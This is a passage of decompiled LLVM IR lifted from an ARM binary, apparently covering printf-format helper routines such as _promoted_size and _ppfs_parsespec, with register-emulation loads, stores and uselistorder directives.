  %v2_14418 = inttoptr i32 %v1_14418 to i32*
  %v3_14418 = load i32, i32* %v2_14418, align 4
  %v1_14420 = sub i32 0, %v3_1440c
  store i32 %v1_14420, i32* %r1.global-to-local, align 4
  %v1_1441c = and i32 %v3_14418, -10
  %v1_14424 = or i32 %v1_1441c, 8
  store i32 %v1_14424, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_1442c = add i32 %v1_1442c, 20
  %v3_1442c = inttoptr i32 %v2_1442c to i32*
  store i32 32, i32* %v3_1442c, align 4
  %v0_14430 = load i32, i32* %r1.global-to-local, align 4
  %v1_14430 = load i32, i32* @r0, align 4
  %v2_14430 = add i32 %v1_14430, 8
  %v3_14430 = inttoptr i32 %v2_14430 to i32*
  store i32 %v0_14430, i32* %v3_14430, align 4
  %v0_14434 = load i32, i32* %r3.global-to-local, align 4
  %v1_14434 = load i32, i32* @r0, align 4
  %v2_14434 = add i32 %v1_14434, 16
  %v3_14434 = inttoptr i32 %v2_14434 to i32*
  store i32 %v0_14434, i32* %v3_14434, align 4
  %v1_1443c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14438

dec_label_pc_14438:                               ; preds = %dec_label_pc_143dc, %dec_label_pc_14418
  %v1_1443c = phi i32 [ %v1_1442c, %dec_label_pc_143dc ], [ %v1_1443c.pre, %dec_label_pc_14418 ]
  %v2_14438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14438, i32* @r4, align 4
  ret i32 %v1_1443c

; uselistorder directives
  uselistorder i32 %v2_14408, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14308.be, { 1, 0 }
  uselistorder i32 %v0_143d0, { 1, 2, 0 }
  uselistorder i32 %v3_14310, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_14310, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_14300, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_1430823, { 1, 0 }
  uselistorder i32 %v0_143d024, { 0, 2, 1 }
  uselistorder i32 %v0_143d017, { 2, 0, 1 }
  uselistorder i32 %v0_14294, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_14438, { 1, 0 }
  uselistorder label %dec_label_pc_143dc, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_143cc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_143bc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1439c, { 1, 0 }
  uselistorder label %dec_label_pc_14388, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_142fc, { 1, 0 }
  uselistorder label %dec_label_pc_142f0, { 1, 0 }
  uselistorder label %dec_label_pc_142c8, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_14460.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1445c

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14468, %entry
  %v0_1445c = phi i32 [ %v1_1445c, %dec_label_pc_14468 ], [ add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38362), %entry ]
  %v1_1445c = add i32 %v0_1445c, -2
  %v2_1445c = inttoptr i32 %v1_1445c to i16*
  %v3_1445c = load i16, i16* %v2_1445c, align 2
  %v4_1445c = sext i16 %v3_1445c to i32
  store i32 %v1_1445c, i32* @ip, align 4
  %v9_14460 = icmp eq i32 %v4_1445c, %v1_14460.pre
  br i1 %v9_14460, label %dec_label_pc_1445c.dec_label_pc_14470_crit_edge, label %dec_label_pc_14468

dec_label_pc_1445c.dec_label_pc_14470_crit_edge:  ; preds = %dec_label_pc_1445c
  br label %dec_label_pc_14470

dec_label_pc_14468:                               ; preds = %dec_label_pc_1445c
  %tmp = icmp ugt i32 %v1_1445c, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38386)
  br i1 %tmp, label %dec_label_pc_1445c, label %dec_label_pc_14470.loopexit

dec_label_pc_14470.loopexit:                      ; preds = %dec_label_pc_14468
  br label %dec_label_pc_14470

dec_label_pc_14470:                               ; preds = %dec_label_pc_14470.loopexit, %dec_label_pc_1445c.dec_label_pc_14470_crit_edge
  %v2_14480.pre-phi = sub i32 %v1_1445c, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38386)
  store i32 %v2_14480.pre-phi, i32* @r2, align 4
  %v4_14484 = sdiv i32 %v2_14480.pre-phi, 2
  %v5_14484 = add i32 %v4_14484, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38362)
  %v6_14484 = inttoptr i32 %v5_14484 to i8*
  %v7_14484 = load i8, i8* %v6_14484, align 1
  %v9_14484 = zext i8 %v7_14484 to i32
  ret i32 %v9_14484

; uselistorder directives
  uselistorder i32 %v2_14480.pre-phi, { 1, 0 }
  uselistorder i32 %v1_1445c, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38386), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14498 = load i32, i32* @r4, align 4
  store i32 %v3_14498, i32* %stack_var_-36, align 4
  %v6_14498 = load i32, i32* @r5, align 4
  %v27_14498 = load i32, i32* @lr, align 4
  %v0_1449c = load i32, i32* %r0.global-to-local, align 4
  %v1_1449c = add i32 %v0_1449c, 16
  %v2_1449c = inttoptr i32 %v1_1449c to i32*
  %v3_1449c = load i32, i32* %v2_1449c, align 4
  %v1_144a4 = and i32 %v3_1449c, 128
  store i32 %v1_144a4, i32* @r4, align 4
  %v2_144a4 = icmp eq i32 %v1_144a4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_1449c, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @lr, align 4
  %v1_144cc = add i32 %v0_1449c, 24
  %v2_144cc = inttoptr i32 %v1_144cc to i32*
  %v3_144cc = load i32, i32* %v2_144cc, align 4
  store i32 %v3_144cc, i32* %fp.global-to-local, align 4
  br i1 %v2_144a4, label %.dec_label_pc_14520_crit_edge, label %dec_label_pc_144d8

.dec_label_pc_14520_crit_edge:                    ; preds = %entry
  %v2_144d0 = inttoptr i32 %v0_1449c to i32*
  %v3_144d0 = load i32, i32* %v2_144d0, align 4
  store i32 %v3_144d0, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_14520

dec_label_pc_144d8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_144e8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_144dc

dec_label_pc_144dc:                               ; preds = %dec_label_pc_1450c.dec_label_pc_144dc_crit_edge, %dec_label_pc_144d8
  %v1_144ec = phi i32 [ %v1_144fc, %dec_label_pc_1450c.dec_label_pc_144dc_crit_edge ], [ 0, %dec_label_pc_144d8 ]
  %v0_144dc = phi i32 [ %v0_144dc.pre, %dec_label_pc_1450c.dec_label_pc_144dc_crit_edge ], [ %v0_1449c, %dec_label_pc_144d8 ]
  %v1_144dc = inttoptr i32 %v0_144dc to i32*
  %v2_144dc = load i32, i32* %v1_144dc, align 4
  %v4_144e0 = mul i32 %v1_144ec, 4
  %v5_144e0 = add i32 %v2_144dc, %v4_144e0
  store i32 %v5_144e0, i32* %r3.global-to-local, align 4
  %v1_144e4 = add i32 %v5_144e0, -4
  %v2_144e4 = inttoptr i32 %v1_144e4 to i8*
  %v3_144e4 = load i8, i8* %v2_144e4, align 1
  %v4_144e4 = zext i8 %v3_144e4 to i32
  store i32 %v4_144e4, i32* %r1.global-to-local, align 4
  store i32 %v2_144e8, i32* @ip, align 4
  %v2_144ec = add i32 %v1_144ec, %v2_144e8
  store i32 %v2_144ec, i32* %r2.global-to-local, align 4
  %v3_144f0 = add i32 %v2_144ec, -72
  %v4_144f0 = inttoptr i32 %v3_144f0 to i8*
  store i8 %v3_144e4, i8* %v4_144f0, align 1
  %v0_144f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_144f4 = add i32 %v0_144f4, -4
  %v2_144f4 = inttoptr i32 %v1_144f4 to i32*
  %v3_144f4 = load i32, i32* %v2_144f4, align 4
  store i32 %v3_144f4, i32* %r3.global-to-local, align 4
  %v0_144f8 = load i32, i32* %r1.global-to-local, align 4
  %v9_144f8 = icmp eq i32 %v0_144f8, %v3_144f4
  %v0_144fc = load i32, i32* %r0.global-to-local, align 4
  %v1_144fc = add i32 %v0_144fc, 1
  store i32 %v1_144fc, i32* %r0.global-to-local, align 4
  br i1 %v9_144f8, label %dec_label_pc_14504, label %dec_label_pc_149c8

dec_label_pc_14504:                               ; preds = %dec_label_pc_144dc
  %v2_14504 = icmp eq i32 %v3_144f4, 0
  br i1 %v2_14504, label %dec_label_pc_14514, label %dec_label_pc_1450c

dec_label_pc_1450c:                               ; preds = %dec_label_pc_14504
  %tmp182 = icmp ult i32 %v1_144fc, 32
  br i1 %tmp182, label %dec_label_pc_1450c.dec_label_pc_144dc_crit_edge, label %dec_label_pc_14514

dec_label_pc_1450c.dec_label_pc_144dc_crit_edge:  ; preds = %dec_label_pc_1450c
  %v0_144dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_144dc

dec_label_pc_14514:                               ; preds = %dec_label_pc_1450c, %dec_label_pc_14504
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1451c = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_1451c, i32* %r0.global-to-local, align 4
  %v0_1452c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_14520

dec_label_pc_14520:                               ; preds = %.dec_label_pc_14520_crit_edge, %dec_label_pc_14514
  %v3_14554.pre-phi = phi i32 [ %.pre, %.dec_label_pc_14520_crit_edge ], [ %v2_144e8, %dec_label_pc_14514 ]
  %v0_1454c64 = phi i32 [ %v3_144d0, %.dec_label_pc_14520_crit_edge ], [ %v2_1451c, %dec_label_pc_14514 ]
  %v0_1452c = phi i32 [ ptrtoint (i32* @global_var_2a010.835 to i32), %.dec_label_pc_14520_crit_edge ], [ %v0_1452c.pre, %dec_label_pc_14514 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 676, i32* %r2.global-to-local, align 4
  %v2_1452c = add i32 %v0_1452c, -38324
  store i32 %v2_1452c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_14540 = inttoptr i32 %v2_1452c to i8*
  store i8* %v4_14540, i8** %stack_var_-120, align 4
  br label %dec_label_pc_1454c

dec_label_pc_14548:                               ; preds = %.thread20, %dec_label_pc_1467c
  %v0_14548 = phi i32 [ %v2_146f4, %.thread20 ], [ %v0_1465876, %dec_label_pc_1467c ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_1467c ]
  store i32 %v0_14548, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1454c

dec_label_pc_1454c:                               ; preds = %dec_label_pc_14520, %dec_label_pc_14548
  %v1_14560 = phi i32 [ %v0_1454c64, %dec_label_pc_14520 ], [ %v0_14548, %dec_label_pc_14548 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_14520 ], [ %stack_var_-44.0, %dec_label_pc_14548 ]
  %v1_1454c = inttoptr i32 %v1_14560 to i8*
  %v2_1454c = load i8, i8* %v1_1454c, align 1
  %v3_1454c = zext i8 %v2_1454c to i32
  store i32 %v3_1454c, i32* %r3.global-to-local, align 4
  %v7_14550 = icmp eq i8 %v2_1454c, 42
  br i1 %v7_14550, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1454c
  store i32 %v1_14560, i32* %r6.global-to-local, align 4
  %v0_14564 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14564, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_145ac.preheader

bb:                                               ; preds = %dec_label_pc_1454c
  %v1_14558 = load i32, i32* %r8.global-to-local, align 4
  %v2_14558 = load i32, i32* %sb.global-to-local, align 4
  %v4_14558 = mul i32 %v2_14558, %v1_14558
  %v5_14558 = add i32 %v4_14558, %v3_14554.pre-phi
  store i32 %v5_14558, i32* %r3.global-to-local, align 4
  %v2_14560 = add i32 %v1_14560, 1
  store i32 %v2_14560, i32* %r6.global-to-local, align 4
  %v0_14564111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14564111, i32* %r1.global-to-local, align 4
  %v3_14568 = add i32 %v5_14558, -40
  %v4_14568 = inttoptr i32 %v3_14568 to i32*
  store i32 %v0_14564111, i32* %v4_14568, align 4
  %v0_145b0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145ac.preheader

dec_label_pc_145ac.preheader:                     ; preds = %.thread8, %bb
  %v0_145b0.pre = phi i32 [ %v1_14560, %.thread8 ], [ %v0_145b0.pre.pre, %bb ]
  %v0_145b4.pre = load i32, i32* @lr, align 4
  %v2_145b4 = add i32 %v0_145b4.pre, 676
  %v3_145b4 = inttoptr i32 %v2_145b4 to i32*
  br label %dec_label_pc_145ac

dec_label_pc_14570:                               ; preds = %dec_label_pc_145ac
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_14574 = load i32, i32* %r1.global-to-local, align 4
  %v2_14574 = add i32 %v0_14574, -214748363
  %tmp139 = sub i32 214748362, %v0_14574
  %v6_14574 = and i32 %tmp139, %v0_14574
  %v7_14574 = icmp slt i32 %v6_14574, 0
  %v8_14574 = icmp slt i32 %v2_14574, 0
  %v9_14574 = icmp eq i32 %v0_14574, 214748363
  %v3_14578 = xor i1 %v8_14574, %v7_14574
  %v4_14578 = or i1 %v9_14574, %v3_14578
  br i1 %v4_14578, label %dec_label_pc_14590, label %dec_label_pc_1457c

dec_label_pc_1457c:                               ; preds = %dec_label_pc_14570
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_14580 = icmp eq i32 %v0_14574, 214748364
  br i1 %v9_14580, label %dec_label_pc_14588, label %dec_label_pc_145a8

dec_label_pc_14588:                               ; preds = %dec_label_pc_1457c
  %v8_1458c = icmp ugt i8 %v2_145b0, 55
  br i1 %v8_1458c, label %dec_label_pc_145a8, label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_14588, %dec_label_pc_14570
  %v2_14594 = mul i32 %v0_14574, 10
  %v1_14598 = add i32 %v2_14594, -48
  store i32 %v1_14598, i32* %r3.global-to-local, align 4
  %v2_1459c = add i32 %v1_14598, %v3_145b0
  br label %dec_label_pc_145a8

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14588, %dec_label_pc_1457c, %dec_label_pc_14590
  %storemerge = phi i32 [ %v2_1459c, %dec_label_pc_14590 ], [ 2147483647, %dec_label_pc_1457c ], [ 2147483647, %dec_label_pc_14588 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_145a8 = add i32 %v0_14630, 1
  store i32 %v1_145a8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145ac

dec_label_pc_145ac:                               ; preds = %dec_label_pc_145ac.preheader, %dec_label_pc_145a8
  %v0_14630 = phi i32 [ %v0_145b0.pre, %dec_label_pc_145ac.preheader ], [ %v1_145a8, %dec_label_pc_145a8 ]
  store i32 676, i32* %r2.global-to-local, align 4
  %v1_145b0 = inttoptr i32 %v0_14630 to i8*
  %v2_145b0 = load i8, i8* %v1_145b0, align 1
  %v3_145b0 = zext i8 %v2_145b0 to i32
  store i32 %v3_145b0, i32* @ip, align 4
  %v4_145b4 = load i32, i32* %v3_145b4, align 4
  store i32 %v4_145b4, i32* %r3.global-to-local, align 4
  %v2_145b8 = mul nuw nsw i32 %v3_145b0, 2
  store i32 %v2_145b8, i32* %r2.global-to-local, align 4
  %v2_145bc = add i32 %v2_145b8, %v4_145b4
  %v3_145bc = inttoptr i32 %v2_145bc to i16*
  %v4_145bc = load i16, i16* %v3_145bc, align 2
  %v6_145bc = zext i16 %v4_145bc to i32
  store i32 %v6_145bc, i32* %r3.global-to-local, align 4
  %v1_145c0 = and i32 %v6_145bc, 8
  %v2_145c0 = icmp eq i32 %v1_145c0, 0
  br i1 %v2_145c0, label %dec_label_pc_145c8, label %dec_label_pc_14570

dec_label_pc_145c8:                               ; preds = %dec_label_pc_145ac
  %v0_145c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_145c8 = add i32 %v0_145c8, -1
  %v2_145c8 = inttoptr i32 %v1_145c8 to i8*
  %v3_145c8 = load i8, i8* %v2_145c8, align 1
  %v4_145c8 = zext i8 %v3_145c8 to i32
  store i32 %v4_145c8, i32* %r3.global-to-local, align 4
  %v7_145cc = icmp eq i8 %v3_145c8, 37
  br i1 %v7_145cc, label %dec_label_pc_145d4, label %dec_label_pc_14694

dec_label_pc_145d4:                               ; preds = %dec_label_pc_145c8
  %v7_145d4 = icmp eq i8 %v2_145b0, 36
  %. = zext i1 %v7_145d4 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_145e0 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_145e0, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_145d4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_145d4, %bb144
  %v0_145e8 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_145d4 ]
  %v2_145e8 = icmp eq i32 %v0_145e8, 0
  %v0_1461c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_145e8, label %dec_label_pc_1461c, label %dec_label_pc_145f0

dec_label_pc_145f0:                               ; preds = %thread-pre-split
  %v2_1461c = icmp eq i32 %v0_1461c, 0
  %v1_145f4 = add i32 %v0_14630, 1
  store i32 %v1_145f4, i32* %r0.global-to-local, align 4
  br i1 %v2_1461c, label %dec_label_pc_149c8, label %dec_label_pc_145fc

dec_label_pc_145fc:                               ; preds = %dec_label_pc_145f0
  %v2_145fc = sub i32 %v0_145e0, %v0_1461c
  %v4_145fc = xor i32 %v0_1461c, %v0_145e0
  %v5_145fc = xor i32 %v2_145fc, %v0_145e0
  %v6_145fc = and i32 %v5_145fc, %v4_145fc
  %v7_145fc = icmp slt i32 %v6_145fc, 0
  %v8_145fc = icmp slt i32 %v2_145fc, 0
  %v9_145fc = icmp eq i32 %v0_145e0, %v0_1461c
  %v3_14600 = xor i1 %v8_145fc, %v7_145fc
  %v4_14600 = or i1 %v9_145fc, %v3_14600
  br i1 %v4_14600, label %dec_label_pc_14610, label %bb145

bb145:                                            ; preds = %dec_label_pc_145fc
  store i32 %v0_145e0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14610

dec_label_pc_1460c:                               ; preds = %dec_label_pc_14630, %dec_label_pc_14638
  %v0_1460c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1460c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14610

dec_label_pc_14610:                               ; preds = %bb145, %dec_label_pc_145fc, %dec_label_pc_1460c
  %v0_14610 = phi i32 [ %v0_145c8, %dec_label_pc_1460c ], [ %v1_145f4, %dec_label_pc_145fc ], [ %v1_145f4, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_1460c ], [ %v0_145e0, %dec_label_pc_145fc ], [ %v0_145e0, %bb145 ]
  store i32 %v0_14610, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_1464c.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_1464c = ptrtoint i8* %v2_1464c.pre to i32
  br label %dec_label_pc_1464c

dec_label_pc_1461c:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_1461c, 1
  br i1 %tmp146, label %dec_label_pc_14630, label %dec_label_pc_14624

dec_label_pc_14624:                               ; preds = %dec_label_pc_1461c
  %v7_14624 = icmp eq i8 %v2_145b0, 109
  br i1 %v7_14624, label %dec_label_pc_14694, label %dec_label_pc_149c8

dec_label_pc_14630:                               ; preds = %dec_label_pc_1461c
  %tmp183 = icmp ugt i32 %v0_14630, %v0_145c8
  br i1 %tmp183, label %dec_label_pc_14638, label %dec_label_pc_1460c

dec_label_pc_14638:                               ; preds = %dec_label_pc_14630
  %v1_14638 = inttoptr i32 %v0_145c8 to i8*
  %v2_14638 = load i8, i8* %v1_14638, align 1
  %v3_14638 = zext i8 %v2_14638 to i32
  store i32 %v3_14638, i32* %r3.global-to-local, align 4
  %v7_1463c = icmp eq i8 %v2_14638, 48
  br i1 %v7_1463c, label %dec_label_pc_1460c, label %bb147

bb147:                                            ; preds = %dec_label_pc_14638
  %v1_14640 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_14640, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_1464c.loopexit:                      ; preds = %dec_label_pc_14654
  %v1_14660 = load i32, i32* @r4, align 4
  %v3_14660 = or i32 %v1_14660, %v0_14674
  store i32 %v3_14660, i32* @r4, align 4
  %v2_14664 = add i32 %v0_1465876, 1
  store i32 %v2_14664, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1464c

dec_label_pc_1464c:                               ; preds = %dec_label_pc_1464c.loopexit, %dec_label_pc_14610
  %v0_1465876 = phi i32 [ %v2_14664, %dec_label_pc_1464c.loopexit ], [ %v0_14610, %dec_label_pc_14610 ]
  store i32 %v3_1464c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14658 = inttoptr i32 %v0_1465876 to i8*
  br label %dec_label_pc_14654

dec_label_pc_14654:                               ; preds = %dec_label_pc_1466c, %dec_label_pc_1464c
  %v0_14674 = phi i32 [ %v2_14674, %dec_label_pc_1466c ], [ 1, %dec_label_pc_1464c ]
  %v0_14654 = phi i32 [ %v5_14654, %dec_label_pc_1466c ], [ %v3_1464c, %dec_label_pc_1464c ]
  %v1_14654 = inttoptr i32 %v0_14654 to i8*
  %v2_14654 = load i8, i8* %v1_14654, align 1
  %v3_14654 = zext i8 %v2_14654 to i32
  store i32 %v3_14654, i32* %r2.global-to-local, align 4
  %v5_14654 = add i32 %v0_14654, 1
  store i32 %v5_14654, i32* %r0.global-to-local, align 4
  %v2_14658 = load i8, i8* %v1_14658, align 1
  %v3_14658 = zext i8 %v2_14658 to i32
  store i32 %v3_14658, i32* %r3.global-to-local, align 4
  %v9_1465c = icmp eq i8 %v2_14658, %v2_14654
  br i1 %v9_1465c, label %dec_label_pc_1464c.loopexit, label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_14654
  %v1_1466c = inttoptr i32 %v5_14654 to i8*
  %v2_1466c = load i8, i8* %v1_1466c, align 1
  %v3_1466c = zext i8 %v2_1466c to i32
  store i32 %v3_1466c, i32* %r3.global-to-local, align 4
  %v2_14670 = icmp eq i8 %v2_1466c, 0
  %v2_14674 = mul i32 %v0_14674, 2
  store i32 %v2_14674, i32* %r1.global-to-local, align 4
  br i1 %v2_14670, label %dec_label_pc_1467c, label %dec_label_pc_14654

dec_label_pc_1467c:                               ; preds = %dec_label_pc_1466c
  %v1_1467c = add i32 %v0_1465876, -1
  %v2_1467c = inttoptr i32 %v1_1467c to i8*
  %v3_1467c = load i8, i8* %v2_1467c, align 1
  %v7_14680 = icmp eq i8 %v3_1467c, 37
  %v0_14684 = load i32, i32* @r4, align 4
  %v1_14684 = and i32 %v0_14684, 10
  store i32 %v1_14684, i32* %r3.global-to-local, align 4
  %v4_14688 = udiv i32 %v1_14684, 2
  %v5_14688 = sub nuw nsw i32 -1, %v4_14688
  %v6_14688 = and i32 %v0_14684, %v5_14688
  store i32 %v6_14688, i32* @r4, align 4
  br i1 %v7_14680, label %dec_label_pc_14690, label %dec_label_pc_14548

dec_label_pc_14690:                               ; preds = %dec_label_pc_1467c
  %v0_14690 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14690, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %bb147, %dec_label_pc_145c8, %dec_label_pc_14624, %dec_label_pc_14690
  %v1_146d4 = phi i32 [ %v0_1465876, %dec_label_pc_14690 ], [ %v0_14630, %bb147 ], [ %v0_14630, %dec_label_pc_14624 ], [ %v0_14630, %dec_label_pc_145c8 ]
  %v0_146d0 = phi i32 [ %v5_14654, %dec_label_pc_14690 ], [ %v0_145c8, %bb147 ], [ %v0_145c8, %dec_label_pc_14624 ], [ %v0_145c8, %dec_label_pc_145c8 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_14690 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_14624 ], [ %stack_var_-44.1, %dec_label_pc_145c8 ]
  %v1_14694 = inttoptr i32 %v0_146d0 to i8*
  %v2_14694 = load i8, i8* %v1_14694, align 1
  %v3_14694 = zext i8 %v2_14694 to i32
  store i32 %v3_14694, i32* %r3.global-to-local, align 4
  %v7_14698 = icmp eq i8 %v2_14694, 42
  br i1 %v7_14698, label %dec_label_pc_146a0, label %dec_label_pc_146e0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_14694
  %v0_146a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_146a0 = icmp eq i32 %v0_146a0, 0
  br i1 %v2_146a0, label %dec_label_pc_146d0, label %dec_label_pc_146a8

dec_label_pc_146a8:                               ; preds = %dec_label_pc_146a0
  %v1_146a8 = inttoptr i32 %v1_146d4 to i8*
  %v2_146a8 = load i8, i8* %v1_146a8, align 1
  %v3_146a8 = zext i8 %v2_146a8 to i32
  store i32 %v3_146a8, i32* %r3.global-to-local, align 4
  %v7_146ac = icmp eq i8 %v2_146a8, 36
  br i1 %v7_146ac, label %dec_label_pc_146b4, label %dec_label_pc_149c8

dec_label_pc_146b4:                               ; preds = %dec_label_pc_146a8
  %v0_146b4 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_146b4, 1
  br i1 %tmp148, label %dec_label_pc_149c8, label %dec_label_pc_146bc

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146b4
  %v0_146c0 = load i32, i32* %r8.global-to-local, align 4
  %v1_146c0 = load i32, i32* %sb.global-to-local, align 4
  %v3_146c0 = mul i32 %v1_146c0, %v0_146c0
  %v4_146c0 = add i32 %v3_146c0, %v3_14554.pre-phi
  store i32 %v4_146c0, i32* %r3.global-to-local, align 4
  %v1_146c4 = add i32 %v1_146d4, 1
  store i32 %v1_146c4, i32* %r6.global-to-local, align 4
  %v2_146c8 = add i32 %v4_146c0, -12
  %v3_146c8 = inttoptr i32 %v2_146c8 to i32*
  store i32 %v0_146b4, i32* %v3_146c8, align 4
  br label %dec_label_pc_146dc

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146a0
  %v1_146d0 = add i32 %v0_146d0, 1
  store i32 %v1_146d0, i32* %r3.global-to-local, align 4
  %v9_146d4 = icmp eq i32 %v1_146d0, %v1_146d4
  br i1 %v9_146d4, label %dec_label_pc_146dc, label %dec_label_pc_149c8

dec_label_pc_146dc:                               ; preds = %dec_label_pc_146d0, %dec_label_pc_146bc
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_146e0

dec_label_pc_146e0:                               ; preds = %dec_label_pc_14694, %dec_label_pc_146dc
  %v0_146e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_146e0 = icmp eq i32 %v0_146e0, 0
  br i1 %v2_146e0, label %dec_label_pc_146ec, label %dec_label_pc_1470c.loopexit

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146e0
  %v0_146ec = load i32, i32* %r6.global-to-local, align 4
  %v1_146ec = inttoptr i32 %v0_146ec to i8*
  %v2_146ec = load i8, i8* %v1_146ec, align 1
  %v3_146ec = zext i8 %v2_146ec to i32
  store i32 %v3_146ec, i32* %r3.global-to-local, align 4
  %v7_146f0 = icmp eq i8 %v2_146ec, 46
  br i1 %v7_146f0, label %.thread20, label %dec_label_pc_14704

.thread20:                                        ; preds = %dec_label_pc_146ec
  %v2_146f4 = add i32 %v0_146ec, 1
  store i32 %v2_146f4, i32* %r6.global-to-local, align 4
  %v1_146f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_146f8, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
